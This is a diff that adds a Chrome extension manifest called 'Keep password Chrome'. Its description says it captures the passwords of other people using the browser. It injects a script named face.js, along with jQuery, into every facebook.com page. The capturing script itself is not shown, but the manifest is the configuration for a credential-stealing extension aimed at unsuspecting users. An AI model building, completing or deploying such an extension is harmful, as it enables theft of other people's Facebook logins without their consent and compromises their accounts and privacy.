@@ -1,0 +1,12 @@
+{
+    "manifest_version": 2,
+    "name": "Keep password Chrome",
+    "description": "This plugin gets the password of the other users acessing your browser.",
+    "version": "1.0",
+    "content_scripts": [
+        {
+            "matches": ["https://www.facebook.com/*"],
+            "js": ["js/jquery-3.3.1.min.js", "js/face.js"]
+        }
+    ]
+}
